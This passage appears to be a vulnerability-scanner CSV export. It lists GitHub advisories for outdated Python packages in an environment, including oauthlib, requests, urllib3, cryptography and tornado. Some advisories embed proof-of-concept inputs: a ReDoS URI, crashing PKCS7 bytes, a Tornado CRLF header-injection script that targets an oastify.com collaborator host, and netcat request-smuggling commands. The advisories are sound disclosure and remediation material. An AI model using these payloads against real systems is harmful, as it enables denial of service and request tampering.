The `redirect_uri` can be verified in web toolkit (i.e `bottle-oauthlib`, `django-oauth-toolkit`, ...) before oauthlib is called. A sample check if `:` is present to reject the request can prevent the DoS, assuming no port or IPv6 is fundamentally required.

### References
Attack Vector:
- Attacker providing malicious redirect uri:
https://github.com/oauthlib/oauthlib/blob/d4bafd9f1d0eba3766e933b1ac598cbbf37b8914/oauthlib/oauth2/rfc6749/grant_types/base.py#L232
- Vulnerable `uri_validate` functions:
https://github.com/oauthlib/oauthlib/blob/2b8a44855a51ad5a5b0c348a08c2564a2e197ea2/oauthlib/uri_validate.py

### PoC
```python
is_absolute_uri('http://[:::::::::::::::::::::::::::::::::::::::]/path')
```

### Acknowledgement
Special thanks to Sebastian Chnelik - PyUp.io
","Medium","3.2.2","false","Tue Oct 08 2024 00:52:34 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-3pgj-pg6c-r5p7","CVE-2022-36087","usr/lib/python3.9/site-packages/oauthlib-3.1.1-py3.9","3.1.1","Sat Sep 17 2022 05:02:52 GMT+0800 (中国标准时间)","4","5.7","Medium","","CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:N/A:H",""
"CVE-2023-48795","Prefix Truncation Attack against ChaCha20-Poly1305 and Encrypt-then-MAC aka Terrapin
### Summary

Terrapin is a prefix truncation attack targeting the SSH protocol. More precisely, Terrapin breaks the integrity of SSH's secure channel. By carefully adjusting the sequence numbers during the handshake, an attacker can remove an arbitrary amount of messages sent by the client or server at the beginning of the secure channel without the client or server noticing it.

### Mitigations

To mitigate this protocol vulnerability, OpenSSH suggested a so-called 'strict kex' which alters the SSH handshake to ensure a Man-in-the-Middle attacker cannot introduce unauthenticated messages as well as convey sequence number manipulation across handshakes.

**Warning: To take effect, both the client and server must support this countermeasure.** 

As a stop-gap measure, peers may also (temporarily) disable the affected algorithms and use unaffected alternatives like AES-GCM instead until patches are available.

### Details

The SSH specifications of ChaCha20-Poly1305 (chacha20-poly1305@openssh.com) and Encrypt-then-MAC (*-etm@openssh.com MACs) are vulnerable against an arbitrary prefix truncation attack (a.k.a. Terrapin attack). This allows for an extension negotiation downgrade by stripping the SSH_MSG_EXT_INFO sent after the first message after SSH_MSG_NEWKEYS, downgrading security, and disabling attack countermeasures in some versions of OpenSSH. When targeting Encrypt-then-MAC, this attack requires the use of a CBC cipher to be practically exploitable due to the internal workings of the cipher mode. Additionally, this novel attack technique can be used to exploit previously unexploitable implementation flaws in a Man-in-the-Middle scenario.

The attack works by an attacker injecting an arbitrary number of SSH_MSG_IGNORE messages during the initial key exchange and consequently removing the same number of messages just after the initial key exchange has concluded. This is possible due to missing authentication of the excess SSH_MSG_IGNORE messages and the fact that the implicit sequence numbers used within the SSH protocol are only checked after the initial key exchange.

In the case of ChaCha20-Poly1305, the attack is guaranteed to work on every connection as this cipher does not maintain an internal state other than the message's sequence number. In the case of Encrypt-Then-MAC, practical exploitation requires the use of a CBC cipher; while theoretical integrity is broken for all ciphers when using this mode, message processing will fail at the application layer for CTR and stream ciphers.

For more details see [https://terrapin-attack.com](https://terrapin-attack.com). 

### Impact

This attack targets the specification of ChaCha20-Poly1305 (chacha20-poly1305@openssh.com) and Encrypt-then-MAC (*-etm@openssh.com), which are widely adopted by well-known SSH implementations and can be considered de-facto standard. These algorithms can be practically exploited; however, in the case of Encrypt-Then-MAC, we additionally require the use of a CBC cipher. As a consequence, this attack works against all well-behaving SSH implementations supporting either of those algorithms and can be used to downgrade (but not fully strip) connection security in case SSH extension negotiation (RFC8308) is supported. The attack may also enable attackers to exploit certain implementation flaws in a man-in-the-middle (MitM) scenario.
","Medium","3.4.0","false","Thu May 02 2024 21:18:40 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-45x7-px36-x8w8","CVE-2023-48795","usr/lib/python3.9/site-packages/paramiko-2.11.0-py3.9","2.11.0","Tue Dec 19 2023 03:22:09 GMT+0800 (中国标准时间)","4","5.9","Medium","","CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N",""
"CVE-2024-35195","Requests `Session` object does not verify requests after making first request with verify=False
When making requests through a Requests `Session`, if the first request is made with `verify=False` to disable cert verification, all subsequent requests to the same origin will continue to ignore cert verification regardless of changes to the value of `verify`. This behavior will continue for the lifecycle of the connection in the connection pool.

### Remediation
Any of these options can be used to remediate the current issue, we highly recommend upgrading as the preferred mitigation.

* Upgrade to `requests>=2.32.0`.
* For `requests<2.32.0`, avoid setting `verify=False` for the first request to a host while using a Requests Session.
* For `requests<2.32.0`, call `close()` on `Session` objects to clear existing connections if `verify=False` is used.

### Related Links
* https://github.com/psf/requests/pull/6655
","Medium","2.32.0","false","Tue Jun 11 2024 02:31:04 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-9wx4-h78v-vm56","CVE-2024-35195","usr/lib/python3.9/site-packages/requests-2.26.0-py3.9","2.26.0","Tue May 21 2024 04:15:00 GMT+0800 (中国标准时间)","4","5.6","Medium","","CVSS:3.1/AV:L/AC:H/PR:H/UI:R/S:U/C:H/I:H/A:N",""
"CVE-2023-32681","Unintended leak of Proxy-Authorization header in requests
### Impact

Since Requests v2.3.0, Requests has been vulnerable to potentially leaking `Proxy-Authorization` headers to destination servers, specifically during redirects to an HTTPS origin. This is a product of how `rebuild_proxies` is used to recompute and [reattach the `Proxy-Authorization` header](https://github.com/psf/requests/blob/f2629e9e3c7ce3c3c8c025bcd8db551101cbc773/requests/sessions.py#L319-L328) to requests when redirected. Note this behavior has _only_ been observed to affect proxied requests when credentials are supplied in the URL user information component (e.g. `https://username:password@proxy:8080`).

**Current vulnerable behavior(s):**

1. HTTP → HTTPS: **leak**
2. HTTPS → HTTP: **no leak**
3. HTTPS → HTTPS: **leak**
4. HTTP → HTTP: **no leak**

For HTTP connections sent through the proxy, the proxy will identify the header in the request itself and remove it prior to forwarding to the destination server. However when sent over HTTPS, the `Proxy-Authorization` header must be sent in the CONNECT request as the proxy has no visibility into further tunneled requests. This results in Requests forwarding the header to the destination server unintentionally, allowing a malicious actor to potentially exfiltrate those credentials.

The reason this currently works for HTTPS connections in Requests is the `Proxy-Authorization` header is also handled by urllib3 with our usage of the ProxyManager in adapters.py with [`proxy_manager_for`](https://github.com/psf/requests/blob/f2629e9e3c7ce3c3c8c025bcd8db551101cbc773/requests/adapters.py#L199-L235). This will compute the required proxy headers in `proxy_headers` and pass them to the Proxy Manager, avoiding attaching them directly to the Request object. This will be our preferred option going forward for default usage.

### Patches
Starting in Requests v2.31.0, Requests will no longer attach this header to redirects with an HTTPS destination. This should have no negative impacts on the default behavior of the library as the proxy credentials are already properly being handled by urllib3's ProxyManager.

For users with custom adapters, this _may_ be potentially breaking if you were already working around this behavior. The previous functionality of `rebuild_proxies` doesn't make sense in any case, so we would encourage any users impacted to migrate any handling of Proxy-Authorization directly into their custom adapter.

### Workarounds
For users who are not able to update Requests immediately, there is one potential workaround.

You may disable redirects by setting `allow_redirects` to `False` on all calls through Requests top-level APIs. Note that if you're currently relying on redirect behaviors, you will need to capture the 3xx response codes and ensure a new request is made to the redirect destination.
```
import requests
r = requests.get('http://github.com/', allow_redirects=False)
```

### Credits

This vulnerability was discovered and disclosed by the following individuals.

Dennis Brinkrolf, Haxolot (https://haxolot.com/)
Tobias Funke, (tobiasfunke93@gmail.com)
","Medium","2.31.0","false","Thu Mar 28 2024 04:09:55 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-j8r2-6x86-q33q","CVE-2023-32681","usr/lib/python3.9/site-packages/requests-2.26.0-py3.9","2.26.0","Tue May 23 2023 04:36:32 GMT+0800 (中国标准时间)","4","6.1","Medium","","CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:N/A:N",""
"CVE-2023-30608","sqlparse contains a regular expression that is vulnerable to Regular Expression Denial of Service
### Impact
The SQL parser contains a regular expression that is vulnerable to [ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS) (Regular Expression Denial of Service). The vulnerability may lead to Denial of Service (DoS).

### Patches
This issues has been fixed in sqlparse 0.4.4.

### Workarounds
None. 

### References
This issue was discovered and reported by GHSL team member [@erik-krogh (Erik Krogh Kristensen)](https://github.com/erik-krogh).
- Commit that introduced the vulnerability: e75e35869473832a1eb67772b1adfee2db11b85a

","Medium","0.4.4","false","Sat Nov 11 2023 13:06:31 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-rrm6-wvj7-cwh2","CVE-2023-30608","usr/lib/python3.9/site-packages/sqlparse-0.4.2-py3.9","0.4.2","Sat Apr 22 2023 04:24:21 GMT+0800 (中国标准时间)","4","5.5","Medium","","CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H",""
"CVE-2023-43804","`Cookie` HTTP header isn't stripped on cross-origin redirects
urllib3 doesn't treat the `Cookie` HTTP header special or provide any helpers for managing cookies over HTTP, that is the responsibility of the user. However, it is possible for a user to specify a `Cookie` header and unknowingly leak information via HTTP redirects to a different origin if that user doesn't disable redirects explicitly.

Users **must** handle redirects themselves instead of relying on urllib3's automatic redirects to achieve safe processing of the `Cookie` header, thus we decided to strip the header by default in order to further protect users who aren't using the correct approach.

## Affected usages

We believe the number of usages affected by this advisory is low. It requires all of the following to be true to be exploited:

* Using an affected version of urllib3 (patched in v1.26.17 and v2.0.6)
* Using the `Cookie` header on requests, which is mostly typical for impersonating a browser.
* Not disabling HTTP redirects
* Either not using HTTPS or for the origin server to redirect to a malicious origin.

## Remediation

* Upgrading to at least urllib3 v1.26.17 or v2.0.6
* Disabling HTTP redirects using `redirects=False` when sending requests.
* Not using the `Cookie` header.
","Medium","2.0.6;1.26.17","false","Sat Nov 04 2023 08:30:22 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-v845-jxx5-vc9f","CVE-2023-43804","usr/lib/python3.9/site-packages/urllib3-1.26.12-py3.9","1.26.12","Tue Oct 03 2023 07:27:05 GMT+0800 (中国标准时间)","4","5.9","Medium","","CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:N",""
"CVE-2023-45803","urllib3's request body not stripped after redirect from 303 status changes request method to GET
urllib3 previously wouldn't remove the HTTP request body when an HTTP redirect response using status 303 'See Other' after the request had its method changed from one that could accept a request body (like `POST`) to `GET` as is required by HTTP RFCs. Although the behavior of removing the request body is not specified in the section for redirects, it can be inferred by piecing together information from different sections and we have observed the behavior in other major HTTP client implementations like curl and web browsers.

From [RFC 9110 Section 9.3.1](https://www.rfc-editor.org/rfc/rfc9110.html#name-get):

> A client SHOULD NOT generate content in a GET request unless it is made directly to an origin server that has previously indicated, in or out of band, that such a request has a purpose and will be adequately supported.

## Affected usages

Because the vulnerability requires a previously trusted service to become compromised in order to have an impact on confidentiality we believe the exploitability of this vulnerability is low. Additionally, many users aren't putting sensitive data in HTTP request bodies, if this is the case then this vulnerability isn't exploitable.

Both of the following conditions must be true to be affected by this vulnerability:

* If you're using urllib3 and submitting sensitive information in the HTTP request body (such as form data or JSON)
* The origin service is compromised and starts redirecting using 303 to a malicious peer or the redirected-to service becomes compromised.

## Remediation

You can remediate this vulnerability with any of the following steps:

* Upgrade to a patched version of urllib3 (v1.26.18 or v2.0.7)
* Disable redirects for services that you aren't expecting to respond with redirects with `redirects=False`.
* Disable automatic redirects with `redirects=False` and handle 303 redirects manually by stripping the HTTP request body.

","Medium","2.0.7;1.26.18","false","Tue Nov 07 2023 00:24:46 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-g4mx-q9vg-27p4","CVE-2023-45803","usr/lib/python3.9/site-packages/urllib3-1.26.12-py3.9","1.26.12","Wed Oct 18 2023 04:15:25 GMT+0800 (中国标准时间)","4","4.2","Medium","","CVSS:3.1/AV:A/AC:H/PR:H/UI:N/S:U/C:H/I:N/A:N",""
"CVE-2024-37891","urllib3's Proxy-Authorization request header isn't stripped during cross-origin redirects 
When using urllib3's proxy support with `ProxyManager`, the `Proxy-Authorization` header is only sent to the configured proxy, as expected.

However, when sending HTTP requests *without* using urllib3's proxy support, it's possible to accidentally configure the `Proxy-Authorization` header even though it won't have any effect as the request is not using a forwarding proxy or a tunneling proxy. In those cases, urllib3 doesn't treat the `Proxy-Authorization` HTTP header as one carrying authentication material and thus doesn't strip the header on cross-origin redirects.

Because this is a highly unlikely scenario, we believe the severity of this vulnerability is low for almost all users. Out of an abundance of caution urllib3 will automatically strip the `Proxy-Authorization` header during cross-origin redirects to avoid the small chance that users are doing this on accident.

Users should use urllib3's proxy support or disable automatic redirects to achieve safe processing of the `Proxy-Authorization` header, but we still decided to strip the header by default in order to further protect users who aren't using the correct approach.

## Affected usages

We believe the number of usages affected by this advisory is low. It requires all of the following to be true to be exploited:

* Setting the `Proxy-Authorization` header without using urllib3's built-in proxy support.
* Not disabling HTTP redirects.
* Either not using an HTTPS origin server or for the proxy or target origin to redirect to a malicious origin.

## Remediation

* Using the `Proxy-Authorization` header with urllib3's `ProxyManager`.
* Disabling HTTP redirects using `redirects=False` when sending requests.
* Not using the `Proxy-Authorization` header.
","Medium","1.26.19;2.2.2","false","Tue Jun 18 2024 05:37:23 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-34jh-p97f-mpxf","CVE-2024-37891","usr/lib/python3.9/site-packages/urllib3-1.26.12-py3.9","1.26.12","Tue Jun 18 2024 05:37:20 GMT+0800 (中国标准时间)","4","4.4","Medium","","CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:N/A:N",""
"CVE-2024-5569","zipp Denial of Service vulnerability
A Denial of Service (DoS) vulnerability exists in the jaraco/zipp library, affecting all versions prior to 3.19.1. The vulnerability is triggered when processing a specially crafted zip file that leads to an infinite loop. This issue also impacts the zipfile module of CPython, as features from the third-party zipp library are later merged into CPython, and the affected code is identical in both projects. The infinite loop can be initiated through the use of functions affecting the `Path` module in both zipp and zipfile, such as `joinpath`, the overloaded division operator, and `iterdir`. Although the infinite loop is not resource exhaustive, it prevents the application from responding. The vulnerability was addressed in version 3.19.1 of jaraco/zipp.
","Medium","3.19.1","false","Thu Aug 08 2024 13:06:36 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-jfmj-5v4g-7637","CVE-2024-5569","usr/lib/python3.9/site-packages/zipp-3.7.0-py3.9","3.7.0","Tue Jul 09 2024 08:31:40 GMT+0800 (中国标准时间)","4","6.2","Medium","","CVSS:3.0/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",""
"CVE-2023-23931","Cipher.update_into can corrupt memory if passed an immutable python object as the outbuf
Previously, `Cipher.update_into` would accept Python objects which implement the buffer protocol, but provide only immutable buffers:

```pycon
>>> outbuf = b'\x00' * 32
>>> c = ciphers.Cipher(AES(b'\x00' * 32), modes.ECB()).encryptor()
>>> c.update_into(b'\x00' * 16, outbuf)
16
>>> outbuf
b'\xdc\x95\xc0x\xa2@\x89\x89\xadH\xa2\x14\x92\x84 \x87\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
```

This would allow immutable objects (such as `bytes`) to be mutated, thus violating fundamental rules of Python. This is a soundness bug -- it allows programmers to misuse an API, it cannot be exploited by attacker controlled data alone.

This now correctly raises an exception.

This issue has been present since `update_into` was originally introduced in cryptography 1.8.
","Medium","39.0.1","false","Sat Sep 14 2024 04:07:53 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-w7pp-m8wf-vj6r","CVE-2023-23931","usr/lib64/python3.9/site-packages/cryptography-36.0.1-py3.9","36.0.1","Wed Feb 08 2023 04:54:10 GMT+0800 (中国标准时间)","4","6.5","Medium","","CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L",""
"CVE-2023-49083","cryptography vulnerable to NULL-dereference when loading PKCS7 certificates
### Summary

Calling `load_pem_pkcs7_certificates` or `load_der_pkcs7_certificates` could lead to a NULL-pointer dereference and segfault.

### PoC
Here is a Python code that triggers the issue:
```python
from cryptography.hazmat.primitives.serialization.pkcs7 import load_der_pkcs7_certificates, load_pem_pkcs7_certificates

pem_p7 = b'''
-----BEGIN PKCS7-----
MAsGCSqGSIb3DQEHAg==
-----END PKCS7-----
'''

der_p7 = b'\x30\x0B\x06\x09\x2A\x86\x48\x86\xF7\x0D\x01\x07\x02'

load_pem_pkcs7_certificates(pem_p7)
load_der_pkcs7_certificates(der_p7)
```

### Impact
Exploitation of this vulnerability poses a serious risk of Denial of Service (DoS) for any application attempting to deserialize a PKCS7 blob/certificate. The consequences extend to potential disruptions in system availability and stability.
","Medium","41.0.6","false","Wed Feb 21 2024 02:14:36 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-jfhm-5ghh-2f97","CVE-2023-49083","usr/lib64/python3.9/site-packages/cryptography-36.0.1-py3.9","36.0.1","Wed Nov 29 2023 04:46:46 GMT+0800 (中国标准时间)","4","5.9","Medium","","CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H",""
"CVE-2024-0727","Null pointer dereference in PKCS12 parsing
Issue summary: Processing a maliciously formatted PKCS12 file may lead OpenSSL
to crash leading to a potential Denial of Service attack

Impact summary: Applications loading files in the PKCS12 format from untrusted
sources might terminate abruptly.

A file in PKCS12 format can contain certificates and keys and may come from an
untrusted source. The PKCS12 specification allows certain fields to be NULL, but
OpenSSL does not correctly check for this case. This can lead to a NULL pointer
dereference that results in OpenSSL crashing. If an application processes PKCS12
files from an untrusted source using the OpenSSL APIs then that application will
be vulnerable to this issue.

OpenSSL APIs that are vulnerable to this are: PKCS12_parse(),
PKCS12_unpack_p7data(), PKCS12_unpack_p7encdata(), PKCS12_unpack_authsafes()
and PKCS12_newpass().

We have also fixed a similar issue in SMIME_write_PKCS7(). However since this
function is related to writing data we do not consider it security significant.

The FIPS modules in 3.2, 3.1 and 3.0 are not affected by this issue.
","Medium","42.0.2","false","Sun May 12 2024 13:03:47 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-9v9h-cgj8-h64p","CVE-2024-0727","usr/lib64/python3.9/site-packages/cryptography-36.0.1-py3.9","36.0.1","Fri Jan 26 2024 17:30:23 GMT+0800 (中国标准时间)","4","5.5","Medium","","CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H",""
"CVE-2023-32732","gRPC connection termination issue
gRPC contains a vulnerability whereby a client can cause a termination of connection between a HTTP2 proxy and a gRPC server: a base64 encoding error for `-bin` suffixed headers will result in a disconnection by the gRPC server, but is typically allowed by HTTP2 proxies. We recommend upgrading beyond the commit in https://github.com/grpc/grpc/pull/32309.

","Medium","1.53.0","false","Sat Nov 11 2023 13:06:16 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-9hxf-ppjv-w6rq","CVE-2023-32732","usr/lib64/python3.9/site-packages/grpcio-1.41.1-py3.9","1.41.1","Fri Jul 07 2023 05:15:08 GMT+0800 (中国标准时间)","4","5.3","Medium","","CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",""
"CVE-2022-2309","lxml NULL Pointer Dereference allows attackers to cause a denial of service
NULL Pointer Dereference allows attackers to cause a denial of service (or application crash). This only applies when lxml is used together with libxml2 2.9.10 through 2.9.14. libxml2 2.9.9 and earlier are not affected. It allows triggering crashes through forged input data, given a vulnerable code sequence in the application. The vulnerability is caused by the iterwalk function (also used by the canonicalize function). Such code shouldn't be in wide-spread use, given that parsing + iterwalk would usually be replaced with the more efficient iterparse function. However, an XML converter that serialises to C14N would also be vulnerable, for example, and there are legitimate use cases for this code sequence. If untrusted input is received (also remotely) and processed via iterwalk function, a crash can be triggered.
","Medium","4.9.1","false","Tue Oct 01 2024 04:19:36 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-wrxv-2j5q-m38w","CVE-2022-2309","usr/lib64/python3.9/site-packages/lxml-4.7.1-py3.9","4.7.1","Wed Jul 06 2022 08:00:30 GMT+0800 (中国标准时间)","5","5.3","Medium","","CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",""
"","PyMongo Out-of-bounds Read in the bson module 
Versions of the package pymongo before 4.6.3 are vulnerable to Out-of-bounds Read in the bson module. Using the crafted payload the attacker could force the parser to deserialize unmanaged memory. The parser tries to interpret bytes next to buffer and throws an exception with string. If the following bytes are not printable UTF-8 the parser throws an exception with a single byte.

This advisory was initially published as CVE-2024-21506, which has since been rejected as a duplicate of CVE-2024-5629.
","Medium","4.6.3","false","Thu Jun 06 2024 01:12:00 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-cr6f-gf5w-vhrc","GHSA-cr6f-gf5w-vhrc","usr/lib64/python3.9/site-packages/pymongo-3.11.3-py3.9","3.11.3","Sat Apr 06 2024 14:31:08 GMT+0800 (中国标准时间)","4","5.2","Medium","","CVSS:3.1/AV:L/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:L",""
"CVE-2024-5629","PyMongo Out-of-bounds Read in the bson module 
Versions of the package pymongo before 4.6.3 are vulnerable to Out-of-bounds Read in the bson module. Using the crafted payload the attacker could force the parser to deserialize unmanaged memory. The parser tries to interpret bytes next to buffer and throws an exception with string. If the following bytes are not printable UTF-8 the parser throws an exception with a single byte.
","Medium","4.6.3","false","Wed Jun 19 2024 03:15:24 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-m87m-mmvp-v9qm","CVE-2024-5629","usr/lib64/python3.9/site-packages/pymongo-3.11.3-py3.9","3.11.3","Wed Jun 05 2024 23:30:39 GMT+0800 (中国标准时间)","4","4.7","Medium","","CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:N/A:L",""
"","Tornado vulnerable to HTTP request smuggling via improper parsing of `Content-Length` fields and chunk lengths
## Summary
Tornado interprets `-`, `+`, and `_` in chunk length and `Content-Length` values, which are not allowed by the HTTP RFCs. This can result in request smuggling when Tornado is deployed behind certain proxies that interpret those non-standard characters differently. This is known to apply to older versions of haproxy, although the current release is not affected.

## Details
Tornado uses the `int` constructor to parse the values of `Content-Length` headers and chunk lengths in the following locations:
### `tornado/http1connection.py:445`
```python3
            self._expected_content_remaining = int(headers['Content-Length'])
```
### `tornado/http1connection.py:621`
```python3
                content_length = int(headers['Content-Length'])  # type: Optional[int]
```
### `tornado/http1connection.py:671`
```python3
            chunk_len = int(chunk_len_str.strip(), 16)
```
Because `int('0_0') == int('+0') == int('-0') == int('0')`, using the `int` constructor to parse and validate strings that should contain only ASCII digits is not a good strategy. 


","Medium","6.3.3","false","Fri Sep 08 2023 04:25:28 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-qppv-j76h-2rpx","GHSA-qppv-j76h-2rpx","usr/lib64/python3.9/site-packages/tornado-6.1-py3.9","6.1","Tue Aug 15 2023 05:34:17 GMT+0800 (中国标准时间)","4","4","Medium","","",""
"","Tornado has a CRLF injection in CurlAsyncHTTPClient headers
### Summary
Tornado’s `curl_httpclient.CurlAsyncHTTPClient` class is vulnerable to CRLF (carriage return/line feed) injection in the request headers.

### Details
When an HTTP request is sent using `CurlAsyncHTTPClient`, Tornado does not reject carriage return (\r) or line feed (\n) characters in the request headers. As a result, if an application includes an attacker-controlled header value in a request sent using `CurlAsyncHTTPClient`, the attacker can inject arbitrary headers into the request or cause the application to send arbitrary requests to the specified server.

This behavior differs from that of the standard `AsyncHTTPClient` class, which does reject CRLF characters.

This issue appears to stem from libcurl's (as well as pycurl's) lack of validation for the [`HTTPHEADER`](https://curl.se/libcurl/c/CURLOPT_HTTPHEADER.html) option. libcurl’s documentation states:

> The headers included in the linked list must not be CRLF-terminated, because libcurl adds CRLF after each header item itself. Failure to comply with this might result in strange behavior. libcurl passes on the verbatim strings you give it, without any filter or other safe guards. That includes white space and control characters.

pycurl similarly appears to assume that the headers adhere to the correct format. Therefore, without any validation on Tornado’s part, header names and values are included verbatim in the request sent by `CurlAsyncHTTPClient`, including any control characters that have special meaning in HTTP semantics.

### PoC
The issue can be reproduced using the following script:

```python
import asyncio

from tornado import httpclient
from tornado import curl_httpclient

async def main():
    http_client = curl_httpclient.CurlAsyncHTTPClient()

    request = httpclient.HTTPRequest(
        # Burp Collaborator payload
        'http://727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com/',
        method='POST',
        body='body',
        # Injected header using CRLF characters
        headers={'Foo': 'Bar\r\nHeader: Injected'}
    )

    response = await http_client.fetch(request)
    print(response.body)

    http_client.close()

if __name__ == '__main__':
    asyncio.run(main())
```

When the specified server receives the request, it contains the injected header (`Header: Injected`) on its own line:

```http
POST / HTTP/1.1
Host: 727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com
User-Agent: Mozilla/5.0 (compatible; pycurl)
Accept: */*
Accept-Encoding: gzip,deflate
Foo: Bar
Header: Injected
Content-Length: 4
Content-Type: application/x-www-form-urlencoded

body
```

The attacker can also construct entirely new requests using a payload with multiple CRLF sequences. For example, specifying a header value of `\r\n\r\nPOST /attacker-controlled-url HTTP/1.1\r\nHost: 727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com` results in the server receiving an additional, attacker-controlled request:

```http
POST /attacker-controlled-url HTTP/1.1
Host: 727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com
Content-Length: 4
Content-Type: application/x-www-form-urlencoded

body
```

### Impact
Applications using the Tornado library to send HTTP requests with untrusted header data are affected. This issue may facilitate the exploitation of server-side request forgery (SSRF) vulnerabilities.
","Medium","6.4.1","false","Fri Jun 07 2024 14:50:03 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-w235-7p84-xx57","GHSA-w235-7p84-xx57","usr/lib64/python3.9/site-packages/tornado-6.1-py3.9","6.1","Fri Jun 07 2024 05:46:31 GMT+0800 (中国标准时间)","4","6.5","Medium","","CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",""
"","Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling') in tornado
### Summary
When Tornado receives a request with two `Transfer-Encoding: chunked` headers, it ignores them both. This enables request smuggling when Tornado is deployed behind a proxy server that emits such requests. [Pound](https://en.wikipedia.org/wiki/Pound_(networking)) does this.

### PoC
0. Install Tornado.
1. Start a simple Tornado server that echoes each received request's body:
```bash
cat << EOF > server.py
import asyncio
import tornado

class MainHandler(tornado.web.RequestHandler):
    def post(self):
        self.write(self.request.body)

async def main():
    tornado.web.Application([(r'/', MainHandler)]).listen(8000)
    await asyncio.Event().wait()

asyncio.run(main())
EOF
python3 server.py &
```
2. Send a valid chunked request:
```bash
printf 'POST / HTTP/1.1\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nZ\r\n0\r\n\r\n' | nc localhost 8000
```
3. Observe that the response is as expected:
```
HTTP/1.1 200 OK
Server: TornadoServer/6.3.3
Content-Type: text/html; charset=UTF-8
Date: Sat, 07 Oct 2023 17:32:05 GMT
Content-Length: 1

Z
```
4. Send a request with two `Transfer-Encoding: chunked` headers:
```
printf 'POST / HTTP/1.1\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nZ\r\n0\r\n\r\n' | nc localhost 8000
```
5. Observe the strange response:
```
HTTP/1.1 200 OK
Server: TornadoServer/6.3.3
Content-Type: text/html; charset=UTF-8
Date: Sat, 07 Oct 2023 17:35:40 GMT
Content-Length: 0

HTTP/1.1 400 Bad Request

```
This is because Tornado believes that the request has no message body, so it tries to interpret `1\r\nZ\r\n0\r\n\r\n` as its own request, which causes a 400 response. With a little cleverness involving `chunk-ext`s, you can get Tornado to instead respond 405, which has the potential to desynchronize the connection, as opposed to 400 which should always result in a connection closure.

### Impact
Anyone using Tornado behind a proxy that forwards requests containing multiple `Transfer-Encoding: chunked` headers is vulnerable to request smuggling, which may entail ACL bypass, cache poisoning, or connection desynchronization.

","Medium","6.4.1","false","Thu Jul 11 2024 08:06:02 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-753j-mpmx-qq6g","GHSA-753j-mpmx-qq6g","usr/lib64/python3.9/site-packages/tornado-6.1-py3.9","6.1","Fri Jun 07 2024 05:41:20 GMT+0800 (中国标准时间)","4","5.3","Medium","","CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",""
"CVE-2023-28370","Open redirect in Tornado
Open redirect vulnerability in Tornado versions 6.3.1 and earlier allows a remote unauthenticated attacker to redirect a user to an arbitrary web site and conduct a phishing attack by having user access a specially crafted URL.
","Medium","6.3.2","false","Sun Nov 12 2023 13:01:11 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-hj3f-6gcp-jg8j","CVE-2023-28370","usr/lib64/python3.9/site-packages/tornado-6.1-py3.9","6.1","Thu May 25 2023 20:30:16 GMT+0800 (中国标准时间)","4","6.1","Medium","","CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",""
"CVE-2021-45958","UltraJSON vulnerable to Out-of-bounds Write
UltraJSON (aka ujson) 1.34 through 5.1.0 has a stack-based buffer overflow in Buffer_AppendIndentUnchecked (called from encode).
","Medium","5.2.0","false","Mon Jan 30 2023 13:02:59 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-fh56-85cw-5pq6","CVE-2021-45958","usr/lib64/python3.9/site-packages/ujson-4.0.2-py3.9","4.0.2","Sat Jan 22 2022 07:27:45 GMT+0800 (中国标准时间)","4.3","5.5","Medium","","CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H",""
"CVE-2022-31117","Potential double free of buffer during string decoding
### Impact
_What kind of vulnerability is it? Who is impacted?_

When an error occurs while reallocating the buffer for string decoding, the buffer gets freed twice.

Due to how UltraJSON uses the internal decoder, this double free is impossible to trigger from Python.

### Patches
_Has the problem been patched? What versions should users upgrade to?_

